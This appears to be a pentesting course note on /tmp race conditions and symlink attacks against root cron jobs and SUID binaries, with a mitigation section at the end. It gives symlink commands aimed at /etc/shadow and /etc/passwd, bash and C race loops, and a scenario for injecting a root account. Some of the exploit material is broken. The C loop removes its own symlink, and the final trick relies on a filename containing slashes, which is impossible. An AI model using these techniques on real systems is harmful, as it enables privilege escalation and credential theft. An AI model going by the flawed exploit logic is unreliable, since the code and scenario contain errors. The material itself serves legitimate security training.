---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.31 tmp Race Conditions"
---

# 44.31 /tmp Race Conditions and Symlink Attacks

## 1. Introduction

In Unix-like systems, the `/tmp` directory is a globally writable location (`drwxrwxrwt`, with the sticky bit set) where any user can create and delete their own temporary files. While convenient for inter-process communication and temporary data storage, this shared namespace creates significant security risks if privileged applications interact with it insecurely.

The most common class of vulnerability in this context is the **Time-of-Check to Time-of-Use (TOCTOU)** race condition. This occurs when a privileged program (like a root cron job, a SUID binary, or a daemon) checks the state of a file in `/tmp`, and then acts on it. If an attacker can manipulate the file—often by replacing it with a symbolic link (symlink)—in the microscopic window between the check and the use, they can trick the privileged process into reading, writing, or changing permissions on an arbitrary system file, such as `/etc/shadow` or `/etc/passwd`.

## 2. Architecture and Attack Flow

The following ASCII diagram illustrates the sequence of a typical TOCTOU symlink attack against a poorly written root script manipulating files in `/tmp`.

```text
+---------------------------------------------------------------------------------+
|                               Linux System                                      |
|                                                                                 |
|  +--------------------+                                                         |
|  | Root Process       |                                                         |
|  | (e.g., cron job)   | Time 1: Check if /tmp/backup.log exists                 |
|  |                    | --------------------------------------> [ File missing ]|
|  |                    |                                                         |
|  |                    | Time 2: Open /tmp/backup.log for writing                |
|  |                    | ----------------------------------+                     |
|  +--------------------+                                   |                     |
|            |                                              v                     |
|            | (Race Window!)                       +--------------------------+  |
|            |                                      | /tmp/backup.log          |  |
|  +--------------------+   Time 1.5: Attacker      | (Symlink to /etc/shadow) |  |
|  | Unprivileged User  |   rapidly creates symlink |                          |  |
|  | (Attacker Shell)   | ------------------------> +--------------------------+  |
|  |                    |                                   |                     |
|  +--------------------+                                   v                     |
|            |                                      +--------------------------+  |
|            |                                      | /etc/shadow              |  |
|            | Time 3: Root process writes          | (Target File Overwritten)|  |
|            |         attacker-controlled data     |                          |  |
|            |         to the symlink!              +--------------------------+  |
|            v                                                                    |
|  +--------------------+                                                         |
|  | /etc/shadow is     |                                                         |
|  | corrupted or       |                                                         |
|  | modified!          |                                                         |
|  +--------------------+                                                         |
+---------------------------------------------------------------------------------+
```

## 3. The 'Why': Understanding TOCTOU and Symlink Vulnerabilities

Why do these vulnerabilities persistently exist?

1.  **Non-Atomic Operations:** File operations in standard scripting languages (Bash, Python) and even C (`access()` followed by `fopen()`) are not inherently atomic. The operating system kernel can interrupt the process between the two system calls to allow other processes (like the attacker's script) to run.
2.  **Predictable Filenames:** Many scripts generate temporary files using predictable names (e.g., `temp_$$.log` where `$$` is the PID, or just `output.txt`). If an attacker can guess the filename, they can pre-create it or race to replace it.
3.  **Global Writable Space:** The `/tmp` and `/var/tmp` directories allow any user to create files. While the sticky bit (`t`) prevents User A from deleting User B's file, it does not stop User A from creating a symlink *before* User B's script runs.

## 4. Types of /tmp Exploitation

### 4.1 Arbitrary File Overwrite
If a privileged script writes user-controlled or predictable data to a temporary file, an attacker can symlink that temporary file to a critical system file.

**Vulnerable Bash Example:**
```bash
#!/bin/bash
# A root cron job that runs every minute
echo "Starting backup at $(date)" > /tmp/backup_status.txt
```
**Exploitation:**
```bash
ln -s /etc/passwd /tmp/backup_status.txt
```
When the cron job runs, it will follow the symlink and overwrite `/etc/passwd` with the string "Starting backup at...", breaking the system or allowing the attacker to inject a rogue user if they control the `date` variable or input.

### 4.2 Arbitrary File Read
If a privileged script reads from a file in `/tmp` and outputs the contents, or uses it in a way the attacker can view, the attacker can symlink it to a sensitive file.

**Vulnerable Bash Example:**
```bash
#!/bin/bash
# Root script that prints a user's temporary config
cat /tmp/user_config.txt
```
**Exploitation:**
```bash
ln -s /etc/shadow /tmp/user_config.txt
```
When root runs the script, the contents of `/etc/shadow` are dumped to stdout.

### 4.3 Arbitrary Permission Change
If a script changes permissions (`chmod`, `chown`) on a file in `/tmp`, symlinking it allows the attacker to change permissions on any system file.

**Vulnerable Bash Example:**
```bash
#!/bin/bash
touch /tmp/service_log.txt
chown www-data:www-data /tmp/service_log.txt
```
**Exploitation:**
If the attacker can replace `/tmp/service_log.txt` with a symlink to `/etc/shadow` right after the `touch` but before the `chown`, they become the owner of `/etc/shadow`.

## 5. Identifying the Race Condition

Finding these vulnerabilities requires analyzing running processes, cron jobs, and custom scripts.

### 5.1 Monitoring File System Activity
Tools like `pspy` (Process Spy) or `inotifywait` can observe processes writing to `/tmp` in real-time.

```bash
# Run pspy to watch for scripts accessing /tmp
./pspy64 -f | grep "/tmp"
```

### 5.2 Analyzing SUID Binaries via `strace` or `ltrace`
If you find a custom SUID binary, use `strace` (if permissions allow) to see if it makes insecure temporary file calls.

```bash
strace -e trace=file ./custom_suid_binary
```
Look for `access("/tmp/file", F_OK)`, followed by `open("/tmp/file", O_RDWR)`.

## 6. Exploiting the Race Condition (The Race Loop)

Exploiting TOCTOU is literally a race against the CPU. You must swap the file at the exact microsecond between the application's check and its action. This is usually achieved using tight while-loops in C or bash.

### 6.1 The Bash Loop Method
If the window is relatively large (e.g., a bash script with a `sleep` or heavy processing between the check and write), bash loops might suffice.

```bash
# Terminal 1: Trigger the target script continuously (if possible)
while true; do /usr/local/bin/vulnerable_script; done

# Terminal 2: The Race Loop
while true; do
    # Remove the legitimate file if it exists
    rm -f /tmp/vuln_file
    
    # Create the malicious symlink pointing to our target
    ln -s /etc/shadow /tmp/vuln_file
done
```

### 6.2 The C Loop Method (For tight race windows)
For compiled SUID binaries, the window between `access()` and `open()` is fractions of a millisecond. A C program using the `renameat2` syscall or `RENAME_EXCHANGE` is significantly faster and more reliable than bash.

```c
#include <unistd.h>
#include <stdio.h>

int main() {
    while(1) {
        unlink("/tmp/target");
        symlink("/etc/shadow", "/tmp/target");
        unlink("/tmp/target");
        // Create dummy file for the application's access() check
        FILE *fp = fopen("/tmp/target", "w");
        fclose(fp);
    }
    return 0;
}
```
Compile and run this simultaneously while the vulnerable SUID binary executes.

## 7. Real-World Penetration Testing Scenario

During a penetration test, you enumerate cron jobs and find `/etc/cron.d/cleanup`, which runs a script `/opt/cleanup.sh` as root every 5 minutes.

1.  **Code Review:** You read `/opt/cleanup.sh`:
    ```bash
    #!/bin/bash
    find /var/www/uploads -type f -mtime +7 > /tmp/to_delete.txt
    chown root:root /tmp/to_delete.txt
    chmod 600 /tmp/to_delete.txt
    ```
2.  **Vulnerability:** The script blindly operates on `/tmp/to_delete.txt`.
3.  **Exploitation Preparation:** You want to steal the `root` user's SSH key. You write a fast race script to symlink `/tmp/to_delete.txt` to `/root/.ssh/id_rsa`.
4.  **Execution:** You start the race script at 4 minutes and 59 seconds past the hour.
5.  **Result:** The cron job runs. It executes the `find` command, writing to the file. Immediately after, your script replaces the file with a symlink to `/root/.ssh/id_rsa`. The cron job then executes `chmod 600 /tmp/to_delete.txt`, which follows the symlink and changes the permissions of `/root/.ssh/id_rsa` to 600... wait, that doesn't help us read it.
6.  **Refined Exploitation:** Instead, we target the `chown` command. We symlink `/tmp/to_delete.txt` to `/etc/passwd`. Wait, `chown root:root` doesn't help either. 
7.  **Actual Exploitation Path:** What if we symlink *before* the `find` command writes to it?
    ```bash
    ln -s /etc/passwd /tmp/to_delete.txt
    ```
    If we win the race right before `find ... > /tmp/to_delete.txt`, the `find` command will write its output (a list of deleted files, which we can control by touching files in `/var/www/uploads` with specific names) directly into `/etc/passwd`. We can name a file `mypassword::0:0:root:/root:/bin/bash` in the uploads directory, ensure it's older than 7 days, and win the race to inject a root user!

## 8. Defensive Hardening & Mitigation

To eliminate `/tmp` race conditions, administrators and developers must enforce secure file handling:

1.  **Kernel Protections:** Enable symlink and hardlink protections in the kernel via `sysctl`. This prevents a user from creating a symlink to a file they do not own in a sticky-bit directory like `/tmp`.
    ```bash
    sysctl -w fs.protected_symlinks=1
    sysctl -w fs.protected_hardlinks=1
    ```
2.  **Use `mktemp`:** Shell scripts must use `mktemp` to create temporary files or directories with random, unpredictable names securely.
    ```bash
    TEMP_FILE=$(mktemp /tmp/script_name.XXXXXX)
    ```
3.  **Atomic C Functions:** C/C++ applications should use atomic functions like `mkstemp()` instead of `access()` followed by `fopen()`. 
4.  **Avoid `/tmp` for Privileged Tasks:** Whenever possible, privileged processes should use restricted, root-owned directories (e.g., `/var/run/app/` or `/run/app/`) instead of the globally writable `/tmp`.

## Chaining Opportunities
- If combined with **[[25 - Cron Job Exploitation]]**, predictable filenames in `/tmp` allow for easy file overwrites to escalate privileges.
- Links with **[[12 - SUID Executable Exploitation]]** when reversing custom binaries reveals unsafe temporary file usage.
- Can be used to corrupt configurations detailed in **[[35 - Defense File Permission Hardening]]**.

## Related Notes
- [[18 - Memory Corruption Basics]] (Race conditions conceptually overlap with concurrent memory access).
- [[20 - Advanced Linux File System Forensics]]
- [[38 - Bypassing Kernel Exploit Mitigations]]
